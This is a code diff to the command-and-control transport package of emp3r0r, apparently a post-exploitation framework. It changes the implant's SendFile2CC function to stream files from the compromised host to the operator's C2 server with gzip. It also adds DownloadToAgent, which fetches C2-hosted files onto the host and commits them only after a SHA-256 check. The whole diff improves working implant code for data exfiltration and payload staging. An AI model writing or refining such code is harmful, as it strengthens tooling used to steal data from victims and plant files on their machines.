@@ -3,13 +3,16 @@ package c2transport
 import (
 	"bytes"
 	"compress/gzip"
+	"crypto/sha256"
 	"encoding/binary"
+	"encoding/hex"
 	"fmt"
 	"io"
 	"net/url"
 	"os"
 	"path/filepath"
 	"strconv"
+	"strings"
 	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
@@ -215,49 +218,128 @@ func DownloadViaC2(config *def.Config, file_to_download, path, checksum string) 
 	return nil, nil
 }
 
-// SendFile2CC send file to CC, with buffering
-// using FTP API
+// SendFile2CC sends a file to the CC over the FTP route from `offset` on. The
+// file is streamed through a gzip writer, so a large file is never held in the
+// agent's memory; memfs sources are already in memory by definition.
 func SendFile2CC(filepath string, offset int64, token string) (err error) {
 	logging.Infof("Sending %s to CC, offset=%d", filepath, offset)
-	// open and read the target file
-	data, err := util.ReadFileAgent(filepath)
-	if err != nil {
-		err = fmt.Errorf("failed to open %s: %v", filepath, err)
-		return err
-	}
 
-	if offset > int64(len(data)) {
-		err = fmt.Errorf("offset %d > file size %d", offset, len(data))
-		return err
+	var src io.Reader
+	if util.IsMemPath(filepath) {
+		data, rerr := util.ReadFileAgent(filepath)
+		if rerr != nil {
+			return fmt.Errorf("failed to open %s: %v", filepath, rerr)
+		}
+		if offset > int64(len(data)) {
+			return fmt.Errorf("offset %d > file size %d", offset, len(data))
+		}
+		src = bytes.NewReader(data[offset:])
+	} else {
+		f, oerr := os.Open(filepath)
+		if oerr != nil {
+			return fmt.Errorf("failed to open %s: %w", filepath, oerr)
+		}
+		defer f.Close()
+		fi, serr := f.Stat()
+		if serr != nil {
+			return fmt.Errorf("stat %s: %w", filepath, serr)
+		}
+		if offset > fi.Size() {
+			return fmt.Errorf("offset %d > file size %d", offset, fi.Size())
+		}
+		if _, serr := f.Seek(offset, io.SeekStart); serr != nil {
+			return fmt.Errorf("seek %s: %w", filepath, serr)
+		}
+		src = f
 	}
-	data = data[offset:]
 
 	conn, _, _, err := EstablishC2Connection(def.CCAddress, token, common.RuntimeConfig.C2Routes.FTP)
-	logging.Infof("FTP connection to %s token=%s", def.CCAddress, token)
 	if err != nil {
-		err = fmt.Errorf("connection failed: %v", err)
-		return err
+		return fmt.Errorf("connection failed: %v", err)
 	}
+	logging.Infof("FTP connection to %s token=%s", def.CCAddress, token)
 
-	// Create a debug wrapper
 	secureConn := transport.NewSecureConn(conn)
 	defer secureConn.Close()
 
-	// open compressor
 	compressor := gzip.NewWriter(transport.NewBulkWriter(secureConn))
-	if err != nil {
-		err = fmt.Errorf("failed to open compressor: %v", err)
-		return err
+	// 1 MiB chunks keep polling transports efficient without buffering the file.
+	n, copyErr := io.CopyBuffer(compressor, src, make([]byte, 1024*1024))
+	closeErr := compressor.Close()
+	if copyErr != nil {
+		return fmt.Errorf("failed after %d bytes: %w", n, copyErr)
 	}
-	defer compressor.Close()
+	if closeErr != nil {
+		return fmt.Errorf("finish gzip stream after %d bytes: %w", n, closeErr)
+	}
+	return nil
+}
 
-	// Use a 1MB buffer to optimize throughput and reduce polling overhead (especially for the http_poll transport)
-	copyBuf := make([]byte, 1024*1024)
-	n, err := io.CopyBuffer(compressor, bytes.NewReader(data), copyBuf)
-	if err != nil {
-		logging.Infof("failed, %d bytes transfered: %v", n, err)
+// DownloadToAgent streams a C2-hosted file into dest and verifies its SHA-256
+// once the transfer has finished. A disk destination is written through a
+// `.part` file that is renamed only after verification, so a truncated or
+// corrupted body is never committed. A memfs destination is buffered because
+// memfs is memory.
+func DownloadToAgent(config *def.Config, name, dest, checksum string) (written int64, digest string, err error) {
+	if name == "" || dest == "" {
+		return 0, "", fmt.Errorf("file name and destination are required")
 	}
-	return err
+
+	if util.IsMemPath(dest) {
+		data, ferr := FetchFile(config, "", name, "", checksum)
+		if ferr != nil {
+			return 0, "", ferr
+		}
+		if err = util.WriteFileAgent(dest, data, 0o600); err != nil {
+			return 0, "", fmt.Errorf("write %s: %w", dest, err)
+		}
+		return int64(len(data)), crypto.SHA256SumRaw(data), nil
+	}
+
+	part := dest + ".part"
+	f, err := os.OpenFile(part, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0o600)
+	if err != nil {
+		return 0, "", fmt.Errorf("create %s: %w", part, err)
+	}
+	committed := false
+	defer func() {
+		if !committed {
+			f.Close()
+			_ = os.Remove(part)
+		}
+	}()
+
+	conn, _, cancel, cerr := EstablishC2Connection(def.CCAddress, name, common.RuntimeConfig.C2Routes.WWW)
+	if cerr != nil {
+		return 0, "", fmt.Errorf("connect for %s: %w", name, cerr)
+	}
+	defer cancel()
+	defer conn.Close()
+
+	hasher := sha256.New()
+	written, err = io.CopyBuffer(io.MultiWriter(f, hasher), transport.NewSecureConn(conn), make([]byte, 1024*1024))
+	if err == nil {
+		err = f.Sync()
+	}
+	if cerr := f.Close(); err == nil {
+		err = cerr
+	}
+	if err != nil {
+		return written, "", fmt.Errorf("download %s: %w", name, err)
+	}
+	if written == 0 {
+		return 0, "", fmt.Errorf("download %s: the www relay delivered no bytes", name)
+	}
+
+	digest = hex.EncodeToString(hasher.Sum(nil))
+	if checksum != "" && !strings.EqualFold(digest, checksum) {
+		return written, digest, fmt.Errorf("checksum mismatch after %d bytes: got %s want %s", written, digest, checksum)
+	}
+	if err = os.Rename(part, dest); err != nil {
+		return written, digest, fmt.Errorf("commit %s: %w", dest, err)
+	}
+	committed = true
+	return written, digest, nil
 }
 
 // FetchFilePeer downloads a file directly from a peer agent using the local
